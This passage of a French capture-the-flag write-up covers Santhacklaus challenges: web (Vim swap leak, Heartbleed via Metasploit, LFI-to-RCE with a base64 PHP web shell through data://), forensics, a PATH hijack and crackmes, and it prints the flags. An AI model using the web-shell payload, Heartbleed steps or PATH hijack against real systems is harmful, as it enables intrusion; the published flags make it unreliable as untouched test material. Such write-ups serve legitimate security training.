+<p>Il n&rsquo;est pas rare que durant l&rsquo;édition d&rsquo;un fichier, les éditeurs créés des fichiers automatiques de sauvegarde. Les différentes extensions sont ainsi testées. Puis, je me suis dis que l&rsquo;éditeur était probablement Vim. A partir de là, quelques recherches indiquent que les fichiers de sauvegardes automatique de Vim ont la syntaxe suivante <code>.nomfichier.extension.swp</code>. Ainsi, on tente de récupérer le fichier <code>admin.html</code> perdu en cours d&rsquo;édition et&hellip;</p>
+
+<pre><code>&gt; $ curl https://jeanclaudevd.santhacklaus.xyz/.admin.html.swp                                                                                                               
+&lt;HTML&gt;
+&lt;HEAD&gt; &lt;TITLE&gt;Admin&lt;/TITLE&gt; &lt;/HEAD&gt;
+&lt;BODY&gt;
+  &lt;h2 class=&quot;tm-about-title&quot;&gt;Administrator&lt;/h2&gt;
+  &lt;IMG SRC=&quot;img/jcvd2.gif&quot;&gt;
+  &lt;IMG SRC=&quot;img/jcvd3.gif&quot;&gt;
+  &lt;IMG SRC=&quot;img/jcvd4.gif&quot;&gt;
+  &lt;p class=&quot;tm-about-description&quot;&gt;
+	Congratz ! Here is the flag IMTLD{ID04L0t0f1s0m3tr1cs}
+&lt;/BODY&gt;
+&lt;/HTML&gt;
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="be-my-valentine-400-pts">Be my Valentine - 400 pts</h3>
+
+<p>Le nom, l&rsquo;énoncé &ldquo;Take care of your heart (maybe also your eyes).&rdquo; ainsi que l&rsquo;image d&rsquo;un grand coeur me fait directement penser à l&rsquo;exploitation de la CVE-2014-0160 plus connue sous le nom de &ldquo;Heartbleed&rdquo;. Une adresse IP ainsi qu&rsquo;un port sont donnés <code>51.75.202.113:1073</code>. Il s&rsquo;agit d&rsquo;un blog sans intérêt particulier.</p>
+
+<p>Pour l&rsquo;identification et l&rsquo;exploitation de la potentielle vulnérabilité, l&rsquo;exploit intégré au framework Metasploit est utilisé. Un détail qui m&rsquo;a fait chercher un petit peu avant de comprendre pourquoi je ne récupérais rien, la version de TLS utilisée par le serveur. Je n&rsquo;y avais pas fait attention et avais laissé la valeur par défaut dans l&rsquo;exploit.. Il s&rsquo;agit en fait de TLS 1.2, visible au niveau du certificat.</p>
+
+<pre><code>&gt; use auxiliary/scanner/ssl/openssl_heartbleed
+&gt; set RHOSTS 51.75.202.113:1073
+&gt; set RPORT 1073
+&gt; set TLS_VERSION 1.2
+
+# Note - Ne pas oublier de modifier la verbosité afin de récupérer les données
+&gt; set verbose true
+
+&gt; exploit
+</code></pre>
+
+<p>Parmi la bouillie d&rsquo;informations exfiltrée, on retrouve ceci :)</p>
+
+<pre><code>[+] 51.75.202.113:1073    - Heartbeat response with leak, 65535 bytes
+[*] 51.75.202.113:1073    - Printable info leaked:
+......\.pp......%..765.........}S.C.....f.....&quot;.!.9.8.........5.............................3.2.....E.D...../...A.......................................w-form-urlencoded....IMTLD{I_Cl34n3d_Y0ur_D1rtY_H34rT_Sw33tY}\:.`..?..h.)
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="3d-industry-1-2-400-pts">3D Industry (&frac12;) - 400 pts</h3>
+
+<p>Le challenge débute ici sur le site d&rsquo;une petite entreprise. Plusieurs pages sont accessibles de cette façon :</p>
+
+<pre><code>https://3d-industry.santhacklaus.xyz/index.php?file=creations.php
+</code></pre>
+
+<p>Une fois encore, premier réflexe : LFI ! Afin d&rsquo;effectuer mes tests, je me suis basé sur l&rsquo;excellent dépôt Github de Swissky : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal" target="\_blank">PayloadAllTheThings</a>.</p>
+
+<p>Après quelques tests, on arrive à l&rsquo;utilisation du wrapper PHP data://. Celui ci permet d&rsquo;envoyer des données, encodées par exemple en base64. Il est ainsi possible par exemple d&rsquo;envoyer du php qui peut être interprété par le serveur. Par exemple, le payload suivant peut être tenté :</p>
+
+<pre><code># Payload
+&quot;&lt;?php system($_GET['cmd']);echo 'Shell done !'; ?&gt;&quot;
+
+# Encodage 
+PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+
+# Requête
+https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+</code></pre>
+
+<p>On remarque l&rsquo;affichage de notre chaine &ldquo;Shell done !&rdquo;. Cela veut dire que le PHP a bien été exécuté. Ainsi, on obtient une exécution de commandes sur le serveur :).</p>
+
+<pre><code>https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=ls
+
+accueil.php admin config contact.php creations.php inc index.php lang lang.php services.php style Shell done ! 
+</code></pre>
+
+<p>Pour des raisons pratique, j&rsquo;ai ensuite utilisé burp afin de fouiller le serveur.</p>
+
+<p>L&rsquo;affichage des fichiers cachés dans le dossier courant avec <code>ls -lah</code> révèle la présence d&rsquo;un répertoire &ldquo;.hidden&rdquo;. En fouillant dans ce répertoire, on trouve plusieurs répertoires imbriqués, jusqu&rsquo;au flag.</p>
+
+<pre><code>https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=cat .hidden/this/is/the/path/to/the/flag/flag.txt
+
+Well done ! You can validate with the flag:
+IMTLD{B3w4r30fURL1nclud3}Shell done !
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="3d-industry-2-2-200-pts">3D Industry (2/2) - 200 pts</h3>
+
+<p>La suite du challenge n&rsquo;est plus tellement du web mais plutôt de la stéganographie/MISC puisqu&rsquo;il s&rsquo;agit de récupérer et exploiter des données. L&rsquo;énoncé indique que le dirigeant est maintenant inquiet à propos des uploads de fichiers, dans la section d&rsquo;administration</p>
+
+<p>Toujours via l&rsquo;exploitation de la LFI, on fouille le serveur en direction de la section d&rsquo;uploads de fichiers et on y trouve un fichier <code>admin/uploads/s3cr37-d0cum3n7.txt</code> contenant une très longue chaine qui semble être de la base64.</p>
+
+<pre><code class="language-bash">$ wget -O 3D.txt https://3d-industry.santhacklaus.xyz/index.php\?file\=data://text/plain\;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4\=\&amp;cmd\=file:///index.php%3Ffile\=data://text/plain%3bbase64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4\=\&amp;cmd\=cat%20admin/uploads/s3cr37ed0cum3n7.txt
+</code></pre>
+
+<p>Une fois la base64 isolée et décodée, on observe au début la chaine suivante &ldquo;SketchUp STL com.sketchup.SketchUp.2018&rdquo;. Je connaissais déjà le logiciel sketchup, permettant de faire de la modélisation 3D. On a donc un fichier. On redirige donc la base64 dans un fichier &ldquo;3D_industry.stl&rdquo;.</p>
+
+<p>Après quelques recherches, je me suis aperçu que Sketchup dispose d&rsquo;un éditeur en ligne ! Parfait, ça m&rsquo;évite d&rsquo;installer le logiciel et ça me convient très bien. On peut donc importer le fichier sur l&rsquo;éditeur et voir le flag s&rsquo;afficher ! :)</p>
+
+<p><br/></p>
+
+<h2 id="forensics-et-réseau">Forensics et réseau</h2>
+
+<h3 id="playa-del-fuego-50-pts">Playa Del Fuego - 50 pts</h3>
+
+<p>Le challenge démarre avec un PDF sur lequel une partie du texte est cachée par une bande noire. Il est demandé de retrouver le contenu du texte caché. Une simple copie du texte du document vers un éditeur de texte révèle la présence de la bande cachée, et donc du flag IMTLD{Bl4ck_0n_Bl4ck_isAbadIDEA}.</p>
+
+<p><br/></p>
+
+<h3 id="what-s-his-name-100-pts">What&rsquo;s his name ? - 100 pts</h3>
+
+<p>La capture réseau fournie avec le challenge concerne des échanges réalisés avec telnet. Le traffic étant en clair, il est possible de retrouver le contenu des échanges avec Wireshark en utilisant la fonctionnalité &ldquo;Follow TCP stream&rdquo;. Ainsi on récupère le contenu suivant, contenant le mot de passe de l&rsquo;utilisateur.</p>
+
+<pre><code>........... ..!..&quot;..'.....#..... ..#..'........!..&quot;..... .....#.....'.............h.7.... .38400,38400....#.nani.lan:1....'..DISPLAY.nani.lan:1......xterm-256color..............Debian GNU/Linux 7
+debian login: jjcceennaa
+.
+Password: W4tch4_W4tch4
+.
+Last login: Tue Oct 30 05:27:07 CDT 2018 from 172.27.191.154 on pts/0
+Linux debian 3.2.0-4-686-pae #1 SMP Debian 3.2.96-2 i686
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="pong-200-pts">Pong - 200 pts</h3>
+
+<p>La capture de trames réseau fournie pour ce challenge contient plusieurs milliers de trame ICMP. Il s&rsquo;agit en réalité d&rsquo;une exfiltration de données via le protocole ICMP. En effet, il est possible d’exfiltrer une faible quantité de données dans le champ data d&rsquo;un ping. Après quelques essais et observations sur le contenu de quelques trames, on observe que les données exfiltrées ressemblent à de la base64. J&rsquo;ai automatisé l&rsquo;extraction avec le script <code>python</code> suivant (dégueulasse, je vous l&rsquo;accorde).</p>
+
+<pre><code>#!/usr/bin/env python
+
+from scapy.all import *
+
+pcap_file = &quot;challenge.pcapng&quot;
+
+data = rdpcap(pcap_file)
+
+output = &quot;&quot;
+
+for i in range(0, len(data)):
+	if data[i].getlayer(IP).dst == &quot;192.168.1.33&quot;:
+		payload = data[i].load.decode(&quot;utf-8&quot;)
+		print(payload)
+		output += payload
+
+output_file = open(&quot;result.b64&quot;, &quot;w&quot;)
+output_file.write(output)
+output_file.close()
+</code></pre>
+
+<p>Par la suite, on décode la base64 pour s&rsquo;apercevoir qu&rsquo;il s&rsquo;agit d&rsquo;un fichier PNG, laissant apparaître le flag IMTLD{4_s1mpl3_3xfilTR4t1oN_tECHNIQUe}.</p>
+
+<p><br/></p>
+
+<h3 id="volatility101-250-pts">Volatility101 - 250 pts</h3>
+
+<p>Super challenge d&rsquo;introduction/rappels à volatility ! On démarre avec un dump de RAM d&rsquo;un Windows qu&rsquo;il faut analyser. Le challenge est composé de trois parties :</p>
+
+<ul>
+<li>Partie 1 - Récupérer le nom de la machine ;</li>
+<li>Partie 2 - Retrouver le nom de l&rsquo;archive ZIP présente sur le bureau de l&rsquo;utilisateur ;</li>
+<li>Partie 3 - Récupérer le contenu de l&rsquo;archive</li>
+</ul>
+
+<p>Après avoir récupéré les informations du dump, permettant notamment de sélectionner un profil, on requête la liste des ruches (hives) afin d&rsquo;avoir l&rsquo;offset de la ruche <code>\REGISTRY\MACHINE\SYSTEM</code> qui contient notamment le nom de la machine.</p>
+
+<pre><code>$ volatility -f challenge.dmp imageinfo
+$ volatility -f challenge.dmp --profile=Win7SP1x86_23418 hivelist
+
+&gt; $ volatility -f challenge.dmp --profile=Win7SP1x86_23418 hivelist                                                                                                          
+Volatility Foundation Volatility Framework 2.6
+Virtual    Physical   Name
+---------- ---------- ----
+0x8900c008 0x28872008 [no name]
+0x8901a1d8 0x28a3a1d8 \REGISTRY\MACHINE\SYSTEM
+0x8903a008 0x2891a008 \REGISTRY\MACHINE\HARDWARE
+0x890c0580 0x2d26c580 \SystemRoot\System32\Config\DEFAULT
+0x96c03008 0x2d9d2008 \Device\HarddiskVolume1\Boot\BCD
+0x96cf29c8 0x2d4d99c8 \SystemRoot\System32\Config\SOFTWARE
+0x9ba13458 0x2d00e458 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
+0x9ba22008 0x2ce76008 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
+0x9ba3c9c8 0x2517d9c8 \SystemRoot\System32\Config\SECURITY
+0x9ba8c9c8 0x24d819c8 \SystemRoot\System32\Config\SAM
+0x9e4699c8 0x235679c8 \??\C:\Users\John\ntuser.dat
+0x9e55e9c8 0x1bfe49c8 \??\C:\Users\John\AppData\Local\Microsoft\Windows\UsrClass.dat
+</code></pre>
+
+<p>Puis on va chercher la clé de registre utilisée pour stocker le nom de la machine.</p>
+
+<pre><code>$ volatility -f challenge.dmp --profile=Win7SP1x86_23418 printkey -o 0x8901a1d8 -K 'ControlSet001\Control\ComputerName\ComputerName'                                       
+Volatility Foundation Volatility Framework 2.6
+Legend: (S) = Stable   (V) = Volatile
+
+----------------------------
+Registry: \REGISTRY\MACHINE\SYSTEM
+Key name: ComputerName (S)
+Last updated: 2018-11-06 13:20:03 UTC+0000
+
+Subkeys:
+
+Values:
+REG_SZ                        : (S) mnmsrvc
+REG_SZ        ComputerName    : (S) WELC0M3
+</code></pre>
+
+<p>Pour la suite du challenge, plusieurs options semblent possible. J&rsquo;ai trouvé l&rsquo;information que je cherchais en observant les commandes qui avaient été tapées par l&rsquo;utilisateur. Grâce au module <code>consoles</code> on récupère celles-ci et on observe la copie d&rsquo;une archive ZIP depuis le répertoire de téléchargement de l&rsquo;utilisateur John vers son bureau. On a ainsi le nom du fichier ZIP.</p>
+
+<pre><code>&gt; $ volatility -f challenge.dmp --profile=Win7SP1x86_23418 consoles 
+
+Volatility Foundation Volatility Framework 2.6
+**************************************************
+ConsoleProcess: conhost.exe Pid: 2404
+Console: 0x6981c0 CommandHistorySize: 50
+HistoryBufferCount: 1 HistoryBufferMax: 4
+OriginalTitle: %SystemRoot%\system32\cmd.exe
+Title: C:\Windows\system32\cmd.exe
+AttachedProcess: cmd.exe Pid: 2388 Handle: 0x5c
+----
+CommandHistory: 0xb1cc0 Application: cmd.exe Flags: Allocated, Reset
+CommandCount: 2 LastAdded: 1 LastDisplayed: 1
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x5c
+Cmd #0 at 0xb2c50: copy C:\Users\John\Downloads\toTh3.zip C:\Users\John\Desktop\
+Cmd #1 at 0xae3d8: dir Desktop
+----
+Screen 0x962a0 X:80 Y:300
+Dump:
+Microsoft Windows [Version 6.1.7601]                                            
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                 
+                                                                                
+C:\Users\John&gt;copy C:\Users\John\Downloads\toTh3.zip C:\Users\John\Desktop\     
+        1 file(s) copied.
+
+&gt; $ volatility -f challenge.dmp --profile=Win7SP1x86_23418 filescan | grep &quot;toTh3.zip&quot;                                                                                       
+Volatility Foundation Volatility Framework 2.6
+0x000000003e067440      8      0 RWD--- \Device\HarddiskVolume2\Users\John\Desktop\toTh3.zip
+0x000000003e712c08      2      0 R--rw- \Device\HarddiskVolume2\Users\John\Downloads\toTh3.zip
+</code></pre>
+
+<p>La dernière étape est de récupérer le contenu de l&rsquo;archive. La première chose à faire est d&rsquo;extraire le fichier du dump.</p>
+
+<pre><code>&gt; $ volatility -f challenge.dmp --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003e067440 -D extractFolder                                                                       
+Volatility Foundation Volatility Framework 2.6
+DataSectionObject 0x3e067440   None   \Device\HarddiskVolume2\Users\John\Desktop\toTh3.zip
+</code></pre>
+
+<p>Une fois le fichier récupéré, il ne reste plus qu&rsquo;à récupérer le contenu de l&rsquo;archive.. Après avoir cracké le mot de passe ;)</p>
+
+<pre><code>$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.None.0x85db26e0.dat
+
+PASSWORD FOUND!!!!: pw == iamahacker
+</code></pre>
+
+<p>On récupère ainsi la dernière partie du flag &ldquo;F0r3ns1cCLUB&rdquo; ce qui permet de créer le flag de l&rsquo;épreuve IMTLD{WELC0M3_toTh3_F0r3ns1cCLUB}.</p>
+
+<p><br/></p>
+
+<h2 id="app-scripts-programmation">App Scripts &amp; Programmation</h2>
+
+<h3 id="mental-arithmetic-150-pts">Mental arithmetic - 150 pts</h3>
+
+<p>Le but de ce challenge est de se connecter à une machine distante afin d&rsquo;y récupérer deux nombres, d&rsquo;effectuer une opération entre ces derniers et de renvoyer le résultat rapidement au serveur.</p>
+
+<p>Je me suis dit pour cela que c&rsquo;était l&rsquo;occasion d&rsquo;essayer la librairie Python <code>pwntools</code>  ! Ainsi, ci-dessous le script (dégueulasse également..) que j&rsquo;ai utilisé :)</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+from pwn import *
+from math import *
+
+# Connexion à la machine
+conn = remote('51.75.202.113', 10001)
+
+# On passe les instructions du challenge
+print(conn.recvline())
+print(conn.recvline())
+print(conn.recvline())
+
+# Réception du premier nombre
+first = conn.recvline().split(' ')[3]
+print(first)
+
+# Réception du second nombre
+second = conn.recvline().split(' ')[3]
+print(second)
+
+# Opérations et calcul du résultat
+print(sqrt(int(first)))
+print(pow(int(second), 3))
+res = sqrt(int(first)) * pow(int(second), 3)
+print(int(res))
+
+# Envoi au serveur
+conn.sendline(str(int(res)))
+
+# Récupération du flag
+print(conn.recv(timeout=2))
+conn.close()
+</code></pre>
+
+<p>Et maintenant, en action&hellip;</p>
+
+<pre><code class="language-bash">&gt; $ python2.7 ./menthal.py                                                                                                                                                   
+[+] Opening connection to 51.75.202.113 on port 10001: Done
+Welcome !!
+
+You must calculate the square root of the 1st number, multiply the result by the cube of the 2nd number and send the integer part of the final result...
+
+I almost forget, you only have 2 seconds to send me the result
+
+3858
+4858
+62.1128006131
+1.14649596712e+11
+7121207540942
+Congratz!! Flag : IMTLD{TheFastestManAlive}
+
+[*] Closed connection to 51.75.202.113 port 10001
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="on-the-road-again-150-pts">On the road again - 150 pts</h3>
+
+<p>Le challenge démarre sur une machine sur laquelle nous avons accès à un binaire et son code source. Le but du challenge est d&rsquo;afficher le contenu du fichier &ldquo;.flag&rdquo;.</p>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(void) {
+    system(&quot;rm /home/challenger1/.flag&quot;);
+    return 0;
+}
+</code></pre>
+
+<p>Le programme réalise donc simplement un <code>rm</code> du fichier &ldquo;.flag&rdquo;. La plupart des commandes classiques sont désactivées. Ainsi, pour réussir à afficher le contenu du fichier, il faut réussir à modifier le comportement du binaire. On peut par exemple essayer de faire en sorte que le <code>rm</code> réalise une action différente. On va ainsi créer un fichier <code>/tmp/rm</code> contenant en réalité un appel à la commande <code>cat</code>. On modifie ensuite la variable d&rsquo;environnement PATH afin que le programme aille chercher dans /tmp sa commande <code>rm</code> et lance donc notre programme :).</p>
+
+<pre><code>$ echo '#/bin/cat' &gt; /var/tmp/rm
+$ PATH=/tmp
+$ ./ch1
+
+#!/bin/cat
+IMTLD{Th1s0neW4sSymPATH3t1c2}
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="qrencoded-150-pts">QREncoded - 150 pts</h3>
+
+<p>Le challenge est composé de plusieurs centaines de QRcodes qu&rsquo;il faut décoder et assembler. Le décodage de quelques uns d&rsquo;entre eux semble donner de la base64. Ainsi, le challenge semble être de décoder les QRcodes un par afin d&rsquo;obtenir une chaine en base64, à décoder.</p>
+
+<p>Le tout peut se faire en une ligne de bash :</p>
+
+<pre><code>for index in {0..843}; do zbarimg -q --raw part_$index.png ; done | tr -d '\n' | base64 -d &gt;&gt; result
+</code></pre>
+
+<p>Quelques explications, on réalise une boucle ayant pour nombre d&rsquo;itérations le nombre de qrcodes. Pour chaque itération, on utilise le programme <code>zbarimg</code> afin de décoder l&rsquo;image. Ce dernier affiche le résultat dans le terminal. Ainsi, à la fin de la boucle, on dispose de toutes les bases64 dans le terminal. On utilise ensuite <code>tr</code> afin de retirer les retours à la ligne et reformer une chaine complète puis on décode le tout et on envoie le résultat dans un fichier.</p>
+
+<pre><code>&gt; $ file result                                                                                                                                                              
+result: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=GIMP 2.10.6, datetime=2018:11:15 22:24:26], progressive, precision 8, 423x532, components 3
+</code></pre>
+
+<p>On obtient donc une jolie image JPEG nous donnant le flag IMTLD{qrCODES_R_3v1l}.</p>
+
+<p><br/></p>
+
+<h2 id="reverse-engineering">Reverse Engineering</h2>
+
+<h3 id="crackme-1-150-pts">Crackme 1 - 150 pts</h3>
+
+<p>Le premier challenge de reverse demande un mot de passe en argument, le vérifie, et affiche &ldquo;password incorrect&rdquo; ou le flag en fonction du mot de passe utilisé.</p>
+
+<p>Nul besoin de rentrer dans les détails du binaire pour ce premier challenge (un peu de répit avant la souffrance&hellip;) puisqu&rsquo;une simple étude des appels aux librairies effectués, à l&rsquo;aide de <code>ltrace</code> permet d&rsquo;obtenir le mot de passe de l&rsquo;application&hellip;</p>
+
+<pre><code>$ ltrace ./crackme_1 loltest                                                                                                                                               
+strlen(&quot;hackerman&quot;)                                                                                        = 9
+strlen(&quot;hackerman&quot;)                                                                                        = 9
+puts(&quot;Password incorrect&quot;Password incorrect
+)                                                                                 = 19
++++ exited (status 0) +++
+
+</code></pre>
+
+<p>On peut donc récupérer le flag en utilisant le mot de passe récupéré.</p>
+
+<pre><code>$ ./crackme_1 hackerman                                                                                                                                                    
+Access granted !
+Flag : IMTLD{Y0uAr34H4ck3rH4rry}
+
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="crackme-2-250-pts">Crackme 2 - 250 pts</h3>
+
+<p>On rentre ici dans le vif du sujet ! Merci à <a href="https://twitter.com/tomtombinary" target="\_blank">@Tomtombinary</a> qui m&rsquo;a aidé pour la résolution de ce challenge notamment en répondant à mes trop nombreuses questions :D. Je passe l&rsquo;ensemble de l&rsquo;analyse du binaire pour me concentrer uniquement sur les parties intéressantes.</p>
+
+<p>A l&rsquo;aide de <code>gdb</code> on peut récupérer les instructions assembleurs du binaire. Deux choses sont à remarquer. Premièrement, on observe ce qui est chargé par le programme à son lancement. On s&rsquo;aperçoit que le programme charge un tas de données qui s&rsquo;avèrent être des caractères.</p>
+
+<pre><code>(gdb) disas main
+Dump of assembler code for function main:
+   0x0000000000001155 &lt;+0&gt;:	push   rbp
+   0x0000000000001156 &lt;+1&gt;:	mov    rbp,rsp
+   0x0000000000001159 &lt;+4&gt;:	push   rbx
+   0x000000000000115a &lt;+5&gt;:	sub    rsp,0x78
+   0x000000000000115e &lt;+9&gt;:	mov    DWORD PTR [rbp-0x74],edi
+   0x0000000000001161 &lt;+12&gt;:	mov    QWORD PTR [rbp-0x80],rsi
+   0x0000000000001165 &lt;+16&gt;:	mov    rax,QWORD PTR [rbp-0x80]
+   0x0000000000001169 &lt;+20&gt;:	mov    rax,QWORD PTR [rax+0x8]
+   0x000000000000116d &lt;+24&gt;:	mov    QWORD PTR [rbp-0x38],rax
+   0x0000000000001171 &lt;+28&gt;:	mov    BYTE PTR [rbp-0x50],0xb6
+   0x0000000000001175 &lt;+32&gt;:	mov    BYTE PTR [rbp-0x4f],0xa9
+   0x0000000000001179 &lt;+36&gt;:	mov    BYTE PTR [rbp-0x4e],0xc2
+   0x000000000000117d &lt;+40&gt;:	mov    BYTE PTR [rbp-0x4d],0xcd
+   0x0000000000001181 &lt;+44&gt;:	mov    BYTE PTR [rbp-0x4c],0x8d
+   0x0000000000001185 &lt;+48&gt;:	mov    BYTE PTR [rbp-0x4b],0x99
+   0x0000000000001189 &lt;+52&gt;:	mov    BYTE PTR [rbp-0x4a],0xc0
+   0x000000000000118d &lt;+56&gt;:	mov    BYTE PTR [rbp-0x49],0xaa
+   0x0000000000001191 &lt;+60&gt;:	mov    BYTE PTR [rbp-0x48],0xab
+   0x0000000000001195 &lt;+64&gt;:	mov    BYTE PTR [rbp-0x47],0xb9
+   0x0000000000001199 &lt;+68&gt;:	mov    BYTE PTR [rbp-0x46],0xa9
+   0x000000000000119d &lt;+72&gt;:	mov    BYTE PTR [rbp-0x45],0xc6
+   0x00000000000011a1 &lt;+76&gt;:	mov    BYTE PTR [rbp-0x44],0x9f
+   0x00000000000011a5 &lt;+80&gt;:	mov    BYTE PTR [rbp-0x43],0xbb
+   0x00000000000011a9 &lt;+84&gt;:	mov    BYTE PTR [rbp-0x42],0xca
+   0x00000000000011ad &lt;+88&gt;:	mov    BYTE PTR [rbp-0x41],0xcc
+   0x00000000000011b1 &lt;+92&gt;:	mov    BYTE PTR [rbp-0x40],0x0
+   0x00000000000011b5 &lt;+96&gt;:	mov    BYTE PTR [rbp-0x70],0x9e
+   0x00000000000011b9 &lt;+100&gt;:	mov    BYTE PTR [rbp-0x6f],0xa2
+   0x00000000000011bd &lt;+104&gt;:	mov    BYTE PTR [rbp-0x6e],0xa9
+   0x00000000000011c1 &lt;+108&gt;:	mov    BYTE PTR [rbp-0x6d],0xa1
+   0x00000000000011c5 &lt;+112&gt;:	mov    BYTE PTR [rbp-0x6c],0x99
+   0x00000000000011c9 &lt;+116&gt;:	mov    BYTE PTR [rbp-0x6b],0xd0
+   0x00000000000011cd &lt;+120&gt;:	mov    BYTE PTR [rbp-0x6a],0xa9
+   0x00000000000011d1 &lt;+124&gt;:	mov    BYTE PTR [rbp-0x69],0xbd
+   0x00000000000011d5 &lt;+128&gt;:	mov    BYTE PTR [rbp-0x68],0x86
+   0x00000000000011d9 &lt;+132&gt;:	mov    BYTE PTR [rbp-0x67],0xc8
+   0x00000000000011dd &lt;+136&gt;:	mov    BYTE PTR [rbp-0x66],0x86
+   0x00000000000011e1 &lt;+140&gt;:	mov    BYTE PTR [rbp-0x65],0xc8
+   0x00000000000011e5 &lt;+144&gt;:	mov    BYTE PTR [rbp-0x64],0xa3
+   0x00000000000011e9 &lt;+148&gt;:	mov    BYTE PTR [rbp-0x63],0x85
+   0x00000000000011ed &lt;+152&gt;:	mov    BYTE PTR [rbp-0x62],0xc9
+   0x00000000000011f1 &lt;+156&gt;:	mov    BYTE PTR [rbp-0x61],0x98
+   0x00000000000011f5 &lt;+160&gt;:	mov    BYTE PTR [rbp-0x60],0xbd
+   0x00000000000011f9 &lt;+164&gt;:	mov    BYTE PTR [rbp-0x5f],0x88
+   0x00000000000011fd &lt;+168&gt;:	mov    BYTE PTR [rbp-0x5e],0x89
+   0x0000000000001201 &lt;+172&gt;:	mov    BYTE PTR [rbp-0x5d],0xc9
+   0x0000000000001205 &lt;+176&gt;:	mov    BYTE PTR [rbp-0x5c],0x86
+   0x0000000000001209 &lt;+180&gt;:	mov    BYTE PTR [rbp-0x5b],0xc3
+   0x000000000000120d &lt;+184&gt;:	mov    BYTE PTR [rbp-0x5a],0xbc
+   0x0000000000001211 &lt;+188&gt;:	mov    BYTE PTR [rbp-0x59],0xd2
+   0x0000000000001215 &lt;+192&gt;:	mov    BYTE PTR [rbp-0x58],0x0
+   0x0000000000001219 &lt;+196&gt;:	mov    DWORD PTR [rbp-0x14],0x0
+   0x0000000000001220 &lt;+203&gt;:	cmp    DWORD PTR [rbp-0x74],0x2
+
+</code></pre>
+
+<p>Par la suite, on trouve dans le code du programme un boucle qui va réaliser une opération sur chacun des caractères du mot de passe. En effet, pour chaque caractère, le programme va ajouter la valeur <code>0x55</code>. Il s&rsquo;agit en réalité d&rsquo;une fonction de chiffrement, utilisant une substitution mono-alphabétique (un ROT).</p>
+
+<pre><code>0x0000000000001246 &lt;+241&gt;:	mov    rax,QWORD PTR [rbp-0x20]
+   0x000000000000124a &lt;+245&gt;:	lea    rdx,[rax+0x1]
+   0x000000000000124e &lt;+249&gt;:	mov    QWORD PTR [rbp-0x20],rdx
+   0x0000000000001252 &lt;+253&gt;:	movzx  edx,BYTE PTR [rax]
+   0x0000000000001255 &lt;+256&gt;:	add    edx,0x55
+   0x0000000000001258 &lt;+259&gt;:	mov    BYTE PTR [rax],dl
+   0x000000000000125a &lt;+261&gt;:	mov    rax,QWORD PTR [rbp-0x20]
+   0x000000000000125e &lt;+265&gt;:	movzx  eax,BYTE PTR [rax]
+   0x0000000000001261 &lt;+268&gt;:	test   al,al
+   0x0000000000001263 &lt;+270&gt;:	jne    0x1246 &lt;main+241&gt;
+
+</code></pre>
+
+<p>Ainsi, on peut récupérer le contenu des caractères chargés en début de programme, effectuer l&rsquo;opération inverse du ROT sur ces derniers pour retrouver le mot de passe du binaire. Le code <code>Python</code> ci-dessous permet d&rsquo;effectuer ces opérations.</p>
+
+<pre><code>&gt;&gt;&gt; chaine = &quot;&quot;&quot;0xb6
+... 0xa9
+... 0xc2
+... 0xcd
+... 0x8d
+... 0x99
+... 0xc0
+... 0xaa
+... 0xab
+... 0xb9
+... 0xa9
+... 0xc6
+... 0x9f
+... 0xbb
+... 0xca
+... 0xcc
+... 0x0
+... 0x9e
+... 0xa2
+... 0xa9
+... 0xa1
+... 0x99
+... 0xd0
+... 0xa9
+... 0xbd
+... 0x86
+... 0xc8
+... 0x86
+... 0xc8
+... 0xa3
+... 0x85
+... 0xc9
+... 0x98
+... 0xbd
+... 0x88
+... 0x89
+... 0xc9
+... 0x86
+... 0xc3
+... 0xbc
+... 0xd2
+... 0x0&quot;&quot;&quot;
+&gt;&gt;&gt; chaine
+'0xb6\n0xa9\n0xc2\n0xcd\n0x8d\n0x99\n0xc0\n0xaa\n0xab\n0xb9\n0xa9\n0xc6\n0x9f\n0xbb\n0xca\n0xcc\n0x0\n0x9e\n0xa2\n0xa9\n0xa1\n0x99\n0xd0\n0xa9\n0xbd\n0x86\n0xc8\n0x86\n0xc8\n0xa3\n0x85\n0xc9\n0x98\n0xbd\n0x88\n0x89\n0xc9\n0x86\n0xc3\n0xbc\n0xd2\n0x0'
+&gt;&gt;&gt; chaine.split('\n')
